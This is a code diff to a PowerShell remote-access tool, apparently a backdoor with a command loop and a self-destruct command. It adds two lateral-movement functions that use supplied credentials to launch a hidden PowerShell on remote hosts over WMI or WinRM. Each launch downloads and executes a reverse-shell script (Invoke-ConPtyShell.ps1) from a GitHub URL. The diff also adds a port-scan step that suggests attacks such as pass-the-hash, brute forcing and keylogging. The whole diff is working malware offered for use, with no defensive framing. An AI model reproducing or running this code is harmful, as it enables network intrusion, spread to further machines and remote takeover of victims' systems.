@@ -198,15 +198,95 @@ function Connect-ZiPo {
 }
 
 
+
+function Spread-WMI {
+    param (
+        [string]$targetIP,
+        [string]$payloadURL = "https://raw.githubusercontent.com/zipo0/studytime-/main/Invoke-ConPtyShell.ps1",
+        [string]$username,
+        [string]$password
+    )
+
+    try {
+        $secure = ConvertTo-SecureString $password -AsPlainText -Force
+        $cred = New-Object System.Management.Automation.PSCredential ($username, $secure)
+
+        $command = "powershell -nop -w hidden -c `"iwr '$payloadURL' -UseBasicParsing | iex`""
+
+        Invoke-WmiMethod -Class Win32_Process -Name Create -ComputerName $targetIP -Credential $cred -ArgumentList $command
+
+        return "[+] WMI spread success to $targetIP"
+    }
+    catch {
+        return "[ERROR] WMI spread failed: $($_.Exception.Message)"
+    }
+}
+
+function Spread-WinRM {
+    param (
+        [string]$targetIP,
+        [string]$payloadURL = "https://raw.githubusercontent.com/zipo0/studytime-/main/Invoke-ConPtyShell.ps1",
+        [string]$username,
+        [string]$password
+    )
+
+    try {
+        $secure = ConvertTo-SecureString $password -AsPlainText -Force
+        $cred = New-Object System.Management.Automation.PSCredential ($username, $secure)
+
+        Invoke-Command -ComputerName $targetIP -Credential $cred -ScriptBlock {
+            iwr "$using:payloadURL" -UseBasicParsing | iex
+        }
+
+        return "[+] WinRM spread success to $targetIP"
+    }
+    catch {
+        return "[ERROR] WinRM spread failed: $($_.Exception.Message)"
+    }
+}
+
+
+
+function PortSuggest {
+    param (
+        [string]$ip,
+        [int[]]$ports
+    )
+
+    $suggestions = @()
+
+    foreach ($port in $ports) {
+        switch ($port) {
+            445     { $suggestions += "[+] $ip:$port → SMB detected → Try: spread, pass-the-hash, PsExec" }
+            5985    { $suggestions += "[+] $ip:$port → WinRM detected → Try: Spread-WinRM" }
+            135     { $suggestions += "[+] $ip:$port → WMI RPC → Try: Spread-WMI" }
+            3389    { $suggestions += "[+] $ip:$port → RDP → Try: brute, keylog, GUI session" }
+            80      { $suggestions += "[+] $ip:$port → Web Server → Check: web panel, upload point" }
+            443     { $suggestions += "[+] $ip:$port → HTTPS → Try: SSL scan, potential login" }
+            21      { $suggestions += "[+] $ip:$port → FTP → Try: anonymous login, upload test" }
+            3306    { $suggestions += "[+] $ip:$port → MySQL → Try: default creds, sql dump" }
+            default { $suggestions += "[-] $ip:$port → Unknown or uncommon port, scan manually" }
+        }
+    }
+
+    return $suggestions -join "`n"
+}
+
+
+
+
+
+
     function Test-Ports {
     param (
         [string]$ip,
-        [int[]]$ports = @(1..1024),
-        [int]$timeout = 300
+        [int[]]$ports = @(21,22,23,25,53,80,110,135,139,143,443,445,3306,3389,5985),
+        [int]$timeout = 100
     )
 
+    $openPorts = @()
     Output-Log "[*] Starting port scan on $ip with timeout $timeout ms..."
-    
+
     foreach ($port in $ports) {
         try {
             $client = New-Object System.Net.Sockets.TcpClient
@@ -215,20 +295,30 @@ function Connect-ZiPo {
             $client.Close()
 
             if ($connected) {
-                Output-Log "[OPEN] ${ip}:${port}"
-        
+                Output-Log "[OPEN] $ip:$port"
+                $openPorts += $port
             } else {
-                Output-Log "[CLOSED] ${ip}:${port}"
+                Output-Log "[CLOSED] $ip:$port"
             }
         }
         catch {
-            Output-Log "[ERROR] $ip`:$port $($_.Exception.Message)"
+            Output-Log "[ERROR] $ip:$port $($_.Exception.Message)"
         }
     }
 
     Output-Log "[*] Port scan completed for $ip."
+
+    if ($openPorts.Count -gt 0) {
+        Output-Log "`n[*] PortSuggest for $ip:"
+        $suggestions = PortSuggest -ip $ip -ports $openPorts
+        $suggestions -split "`n" | ForEach-Object { Output-Log $_ }
+    } else {
+        Output-Log "[*] No open ports found. No suggestions available."
+    }
+
     return ""
 }
+
 
 
 
@@ -610,6 +700,7 @@ Arch: $env:PROCESSOR_ARCHITECTURE${esc}[0m
                             Test-Ports -ip $ip  # сканирует 1..65535
                             $response = ""
                         }
+                        
                         elseif ($args.Length -eq 3) {
                             $ip = $args[1]
                             $port = [int]$args[2]
@@ -624,7 +715,32 @@ Arch: $env:PROCESSOR_ARCHITECTURE${esc}[0m
                             Output-Log $response
                         }
                     }
-
+                    elseif ($cmd.StartsWith("spread-wmi")) {
+                        $args = $cmd.Split(" ")
+                        if ($args.Length -eq 4) {
+                            $response = Spread-WMI -targetIP $args[1] -username $args[2] -password $args[3]
+                        } else {
+                            $response = "[USAGE] spread-wmi <ip> <username> <password>"
+                        }
+                    }
+                    elseif ($cmd.StartsWith("spread-winrm")) {
+                        $args = $cmd.Split(" ")
+                        if ($args.Length -eq 4) {
+                            $response = Spread-WinRM -targetIP $args[1] -username $args[2] -password $args[3]
+                        } else {
+                            $response = "[USAGE] spread-winrm <ip> <username> <password>"
+                        }
+                    }
+                    elseif ($cmd.StartsWith("portsuggest")) {
+                        $args = $cmd.Split(" ")
+                        if ($args.Length -ge 3) {
+                            $ip = $args[1]
+                            $ports = $args[2..($args.Length - 1)] | ForEach-Object { [int]$_ }
+                            $response = PortSuggest -ip $ip -ports $ports
+                        } else {
+                            $response = "[USAGE] portsuggest <ip> <port1> <port2> ..."
+                        }
+                    }
 
                     elseif ($cmd -eq "!die") {
                         $response = "[!] Self-destruct initiated..."
